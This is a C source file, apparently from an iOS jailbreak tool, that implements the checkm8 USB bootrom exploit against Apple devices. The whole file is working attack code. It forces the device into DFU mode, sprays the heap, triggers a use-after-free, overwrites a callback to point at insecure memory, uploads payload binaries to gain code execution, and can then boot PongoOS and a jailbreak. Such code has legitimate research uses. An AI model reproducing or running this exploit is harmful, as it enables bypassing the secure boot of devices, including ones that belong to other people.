#include <exploit/exploit.h>

bool bootingPongoOS;

// Purpose: Trigger a DFU mode reset on the device
bool checkm8Reset(device_t *device)
{
    transfer_ret_t transferRet;
    if (sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LENGTH, &transferRet)
    && transferRet.ret == USB_TRANSFER_OK && transferRet.sz == DFU_FILE_SUFFIX_LENGTH
    && DFUSetStateWaitReset(&device->handle) == true
    && sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, &transferRet)
    && transferRet.ret == USB_TRANSFER_OK && transferRet.sz == EP0_MAX_PACKET_SIZE)
    {
        return true;
    }
    sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
    return false;
}

// Purpose: Place the device into a stalled state
bool checkm8Stall(device_t *device)
{

    unsigned usbAbortTimeout = 10;
    transfer_ret_t transferRet;
    usb_handle_t *handle = &device->handle;
    while (sendUSBControlRequestAsyncNoData(handle, 0x80, DFU_ABORT, 0x304, 0xA, 0xC0, usbAbortTimeout, &transferRet)) {
        if (transferRet.sz < 0xC0
        && sendUSBControlRequestAsyncNoData(handle, 0x80, 6, 0x304, 0xA, 0x40, 1, &transferRet)
        && transferRet.sz == 0) {
            return true;
        }
        usbAbortTimeout = (usbAbortTimeout + 1) % 10;
    }
    return false;
}

// Purpose: Send a packet that will leak a zero-length packet
bool checkm8Leak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC0, transferRet);
}

// Purpose: Send a regular packet that will not leak a zero-length packet
bool checkm8NoLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC1, transferRet);
}

// Purpose: Stall the device-to-host endpoint
bool checkm8USBRequestStall(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x2, DFU_GETSTATUS, 0x0, 0x80, 0x0, transferRet);
}

// Purpose: Send a packet that will leak a zero-length packet
bool checkm8USBRequestLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x40, transferRet);
}

// Purpose: Send a regular packet that will not leak a zero-length packet
bool checkm8USBRequestNoLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x41, transferRet);
}

// Purpose: Spray the heap in order to craft a hole for the IO buffer allocation
bool checkm8HeapSpray(device_t *device)
{
    // Stall the endpoint and leak a ZLP
    if (!checkm8Stall(device)) { return false; }
    LOG(LOG_DEBUG, "Stalled endpoint");

    // We _can_ send 0x10 packets to create a perfect hole
    // for the IO buffer, but we can send 0x6 packets
    // so that allocations are shuffled, and IO buffer
    // is still allocated elsewhere, and this is a quicker solution
    int hole = 0x6;
    // Send non-leaking packets
    for (int i = 1; i <= hole; i++)
    {
        if (!checkm8NoLeak(device)) { return false; }
    }
    LOG(LOG_DEBUG, "Sent %d regular packets", hole);

    // Leak a ZLP
    if (!checkm8USBRequestLeak(device)) { return false; }

    // Make sure setup packet has larger size to trigger ZLP leaks
    if (!checkm8NoLeak(device)) { return false; }
    
    return true;
}

// Purpose: Trigger the use-after-free vulnerability
bool checkm8TriggerUaF(device_t *device)
{
    unsigned usb_abort_timeout = 4; // PR for T8011: 1.13 seconds on 2s timeout
	transfer_ret_t transfer_ret;

	while(sendUSBControlRequestAsyncNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SIZE, usb_abort_timeout, &transfer_ret)) {
		if(transfer_ret.sz < config_overwrite_pad 
        && sendUSBControlRequestNoData(&device->handle, 0, 0, 0, 0, config_overwrite_pad - transfer_ret.sz, &transfer_ret) 
        && transfer_ret.ret == USB_TRANSFER_STALL) {
			sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
			return true;
		}
		if(!sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL)) {
			break;
		}
		usb_abort_timeout = (usb_abort_timeout + 1) % 10;
	}
    
	return false;
}

// Purpose: Send the payload and overwrite to the device and trigger shellcode execution
bool checkm8SendPayload(device_t *device)
{
    char *gasterPayload = "src/exploit/payloads/gaster/payload.bin";
    char *yoloPayload = malloc(50); // 4 bytes of extra space to be safe
    if (cpid == 0x8000 || cpid == 0x8001 || cpid == 0x8003) {
        sprintf(yoloPayload, "src/boot/payloads/checkra1n/yolo_s%X.bin", cpid);
    } else if (cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
        sprintf(yoloPayload, "src/boot/payloads/checkra1n/yolo_t%X.bin", cpid);
    }
    uint64_t *overwrite;
    size_t overwriteSize;

    // Prepare the overwrite
    if (bootingPongoOS) {
        LOG(LOG_DEBUG, "Preparing overwrite for PongoOS");
        void *blank[DFU_MAX_TRANSFER_SIZE];
        memset(&blank, '\0', DFU_MAX_TRANSFER_SIZE);
        overwrite = (uint64_t *)blank;
        overwrite[5] = insecure_memory_base;
        overwriteSize = 0x30; // It will always be 0x30
    }
    else {
        if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8003 || cpid == 0x8000) {
            checkm8_overwrite_t checkm8_overwrite;
            memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite_t));
            checkm8_overwrite.callback.callback = insecure_memory_base;
            overwrite = (uint64_t *)&checkm8_overwrite;
            overwriteSize = sizeof(checkm8_overwrite);
        }
        else if (cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
            checkm8_overwrite_t checkm8_overwrite;
            memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite_t));
            checkm8_overwrite.callback.callback = nop_gadget;
            checkm8_overwrite.callback.next = insecure_memory_base;
            checkm8_overwrite.heap_pad_0 = 0xF7F6F5F4F3F2F1F0;
			checkm8_overwrite.heap_pad_1 = 0xFFFEFDFCFBFAF9F8;
            overwrite = (uint64_t *)&checkm8_overwrite;
            overwriteSize = sizeof(checkm8_overwrite);
        }
        else {
            LOG(LOG_FATAL, "ERROR: CPID not supported!");
        }
    }

    // Prepare the payload
    FILE *payloadFile = fopen(bootingPongoOS ? yoloPayload : gasterPayload, "rb");
    if (payloadFile == NULL)
    {
        LOG(LOG_FATAL, "ERROR: failed to open payload file: %s", bootingPongoOS ? yoloPayload : gasterPayload);
        return false;
    }
    fseek(payloadFile, 0, SEEK_END);
    size_t payloadSize = ftell(payloadFile);
    fseek(payloadFile, 0, SEEK_SET);
    char *payload = malloc(payloadSize);
    fread(payload, 1, payloadSize, payloadFile);
    fclose(payloadFile);

    // Sanity checks
    if (overwrite == NULL || overwriteSize == 0) {
        LOG(LOG_FATAL, "ERROR: failed to read overwrite file");
        if (overwrite == NULL) {
            LOG(LOG_FATAL, "Overwrite is NULL");
        }
        if (overwriteSize == 0) {
            LOG(LOG_FATAL, "Overwrite size is 0");
        }
        return false;
    }

    if (payload == NULL || payloadSize == 0) {
        LOG(LOG_FATAL, "ERROR: failed to read payload file");
        if (payload == NULL) {
            LOG(LOG_FATAL, "Payload is NULL");
        }
        if (payloadSize == 0) {
            LOG(LOG_FATAL, "Payload size is 0");
        }
        return false;
    }

    LOG(LOG_DEBUG, "Prepared payload and overwrite");

    transfer_ret_t transferRet;

    if (cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
        // Stall endpoint
        if (!checkm8USBRequestStall(device))
        {
            LOG(LOG_ERROR, "Failed to stall endpoint");
            return false;
        }

        if (!checkm8USBRequestLeak(device))
        {
            LOG(LOG_ERROR, "Failed to send packet");
            return false;
        }
    }

    for(size_t i = 0; i < 2; i++) {
		sendUSBControlRequestNoData(&device->handle, DFU_UPLOAD, 3, 0, 0x80, 0, NULL);
	}

    LOG(LOG_DEBUG, "Sending overwrite of size 0x%2X", overwriteSize);

    if (sendUSBControlRequest(&device->handle, 0, 0, 0, 0, overwrite, overwriteSize, &transferRet)
    && transferRet.ret == USB_TRANSFER_STALL)
    {
        // Need to figure out why gaster needs this but PongoOS doesn't
        if (!bootingPongoOS) {
            if (!sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL)) {
                return false;
            }
        }
        bool ret = true;
        size_t packetSize;
        int i;
        LOG(LOG_DEBUG, "Sending payload of size 0x%X", payloadSize);

        // Send the payload
        for(i = 0; ret && i < payloadSize; i += packetSize) {
            packetSize = MIN(payloadSize - i, DFU_MAX_TRANSFER_SIZE);
            ret = sendUSBControlRequest(&device->handle, 0x21, DFU_DNLOAD, 0, 0, &payload[i], packetSize, NULL);
        }
        if (ret) {
            if (bootingPongoOS) {
                LOG(LOG_INFO,  "Waiting for device to reconnect in download mode");
            } else {
                LOG(LOG_DEBUG, "Sent payload, about to trigger execution");
            }
        } else {
            LOG(LOG_ERROR, "Failed to send payload, transferred 0x%X of 0x%X bytes", i, payloadSize);
            return false;
        }
        ret = sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
    } else {
        LOG(LOG_ERROR, "Failed to send overwrite");
        return false;
    }
    // if (!bootingPongoOS) { free(overwrite); }
    free(payload);

    return true;
}

// Purpose: Check if the device has been successfully exploited
int checkm8Done(device_t *device)
{
    return isSerialNumberPwned(getDeviceSerialNumberIOKit(&device->handle));
}

// Purpose: Get the device into DFU mode
int checkm8PrepareDevice(device_t *device) {
    int ret = findDevice(device, false);
    if (ret == -1)
    {
        return -1;
    }

    if (device->mode == MODE_NORMAL) {
        LOG(LOG_SUCCESS, "Found device in normal mode");
        if (enterRecoveryMode() != 0) {
            LOG(LOG_ERROR, "Failed to place device with udid %s into recovery mode", device->serialNumber);
            return -1;
        }
        LOG(LOG_INFO, "Waiting for device to enter recovery mode");
        if (waitForDeviceInMode(device, MODE_RECOVERY, 20) != 0) {
            LOG(LOG_ERROR, "Device with udid %s failed to enter recovery mode", device->serialNumber);
            return -1;
        }
        LOG(LOG_SUCCESS, "Device entered recovery mode successfully!", device->serialNumber);
    }

    if (device->mode == MODE_RECOVERY) {
        // TODO: DFU helper
        waitUSBHandle(&device->handle, 0, 0, NULL, NULL);
        bool ret = sendRecoveryModeCommand(&device->handle, "setenv auto-boot true");
        if (!ret) {
            LOG(LOG_ERROR, "Failed to send auto-boot true");
        }
        ret = sendRecoveryModeCommand(&device->handle, "saveenv");
        if (!ret) {
            LOG(LOG_ERROR, "Failed to send saveenv");
        }
        LOG(LOG_DEBUG, "Sent auto-boot true and saveenv");
        LOG(LOG_INFO, "Waiting for device to enter DFU mode");
        if (waitForDeviceInMode(device, MODE_DFU, 30) != 0) {
            LOG(LOG_FATAL, "Could not find device in DFU mode after 30 seconds", device->serialNumber);
            return -1;
        }
        LOG(LOG_SUCCESS, "Device entered DFU mode successfully!");
    }

    if (isSerialNumberPwned(device->serialNumber) && !isInDownloadMode(device->serialNumber))
    {
        LOG(LOG_ERROR, "Device is already in pwned DFU mode, not performing exploit");
        return 1;
    }
    LOG(LOG_DEBUG, "Device serial number: %s", device->serialNumber);
    
    return 0;
}

char *stageToString(int stage) {
    switch (stage) {
        case STAGE_RESET:
            return "Reset";
        case STAGE_HEAP_SPRAY:
            return "Heap spray";
        case STAGE_TRIGGER:
            return "UaF trigger";
        case STAGE_PATCH:
            return bootingPongoOS ? "Download mode" : "Patching";
        case STAGE_DONE:
            return "Done";
        case STAGE_PONGO:
            return "PongoOS";
        default:
            return "Unknown";
    }
}

int checkm8()
{
    device_t device;
    bootingPongoOS = getArgumentByName("PongoOS")->boolVal || getArgumentByName("Jailbreak")->boolVal;
    initUSBHandle(&device.handle, 0x5ac, 0x1227);
    if (checkm8PrepareDevice(&device) != 0)
    {
        LOG(LOG_FATAL, "Failed to prepare device");
        return -1;
    }
    bool pwned;
    waitUSBHandle(&device.handle, 0, 0, &checkm8CheckUSBDevice, &pwned); // So we can check CPID
    closeUSBHandle(&device.handle);
    if (bootingPongoOS && !(cpid == 0x8000 || cpid == 0x8001 || cpid == 0x8003 || cpid == 0x7000
    || cpid == 0x7001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015)) {
        LOG(LOG_FATAL, "PongoOS is not supported on this device, CPID: 0x%X", cpid);
        return -1;
    }
    if (getArgumentByName("Exploit")->set && cpid != 0x8011) {
        LOG(LOG_FATAL, "Regular exploit is not supported on this device");
        return -1;
    }
    bool ret;
    struct timespec start, end;

    if (!getArgumentByName("Quick mode")->boolVal) {
        LOG_NO_NEWLINE(LOG_INFO, "Press enter to exploit device");
        getchar();
    }

    LOG(LOG_INFO, bootingPongoOS ? "Exploiting with checkm8 and booting PongoOS" : "Exploiting with checkm8");

    int stage = STAGE_RESET;
    int stageForLogging = STAGE_RESET;
    char *finalSerial = NULL;

    if (isInDownloadMode(getDeviceSerialNumberIOKit(&device.handle))) {
        stage = STAGE_PONGO;
    }

    clock_gettime(CLOCK_MONOTONIC, &start);
    while (stage != STAGE_DONE && waitUSBHandle(&device.handle, 0, 0, &checkm8CheckUSBDevice, &pwned)) {
        if (!pwned) {
            if (stage == STAGE_RESET) {
                LOG(LOG_INFO, "Resetting device");
                ret = checkm8Reset(&device);
                stage = STAGE_HEAP_SPRAY;
                stageForLogging = STAGE_RESET;
            }
            else if (stage == STAGE_HEAP_SPRAY) {
                LOG(LOG_INFO, "Spraying the heap");
                ret = checkm8HeapSpray(&device);
                stage = STAGE_TRIGGER;
                stageForLogging = STAGE_HEAP_SPRAY;
            }
            else if (stage == STAGE_TRIGGER) {
                LOG(LOG_INFO, "Triggering UaF");
                ret = checkm8TriggerUaF(&device);
                stage = STAGE_PATCH;
                stageForLogging = STAGE_TRIGGER;
            }
            else if (stage == STAGE_PATCH) {
                if (!bootingPongoOS) {
                    LOG(LOG_INFO, "Patching");
                }
                ret = checkm8SendPayload(&device);
                stageForLogging = STAGE_PATCH;
                // Try to re-init so serial number is updated
                resetUSBHandle(&device.handle);
                closeUSBHandle(&device.handle);
                waitUSBHandle(&device.handle, 0, 0, &checkm8CheckUSBDevice, &pwned);
                finalSerial = getDeviceSerialNumberWithTransfer(&device.handle);
                if (isSerialNumberPwned(finalSerial) && !bootingPongoOS) {
                    pwned = true;
                }
                stageForLogging = STAGE_PATCH;
                stage = (isSerialNumberPwned(finalSerial) && bootingPongoOS) ? STAGE_PONGO : STAGE_DONE;
            } else {
                LOG(LOG_INFO, "Exploit complete, booting PongoOS");
                ret = bootPongoOS(&device);
                clock_gettime(CLOCK_MONOTONIC, &end);
                double timeTaken = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
                LOG(LOG_SUCCESS, "Successfully booted PongoOS in %.2f seconds", timeTaken);
                if (getArgumentByName("Jailbreak")->boolVal) {
                    extern void jailbreakBoot(usb_handle_t *handle);
                    jailbreakBoot(&device.handle);
                }
                stage = STAGE_DONE;
                stageForLogging = STAGE_PONGO;
            }

            if (ret && stageForLogging != STAGE_PONGO) {
                LOG(LOG_SUCCESS, "%s completed successfully", stageToString(stageForLogging));
            } else if (stageForLogging != STAGE_PONGO) {
                LOG(LOG_FATAL, "%s failed", stageToString(stageForLogging));
                if (stage != STAGE_PATCH && stage != STAGE_DONE) {
                    stage = STAGE_RESET;
                }
            }
            resetUSBHandle(&device.handle);
        }
           
        closeUSBHandle(&device.handle);
    }
    if (!bootingPongoOS) {
        if (!pwned) {
            LOG(LOG_FATAL, "Exploit failed"); 
            return -1;
        }
        clock_gettime(CLOCK_MONOTONIC, &end);
        double timeTaken = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
        LOG(LOG_SUCCESS, "Exploit succeeded");
        LOG(LOG_INFO, "Exploited in %.2f seconds", timeTaken);
        if (strcmp(finalSerial, "(null)") != 0) { LOG(LOG_INFO, "Serial number: %s", finalSerial); }
    }
    return 0;
}
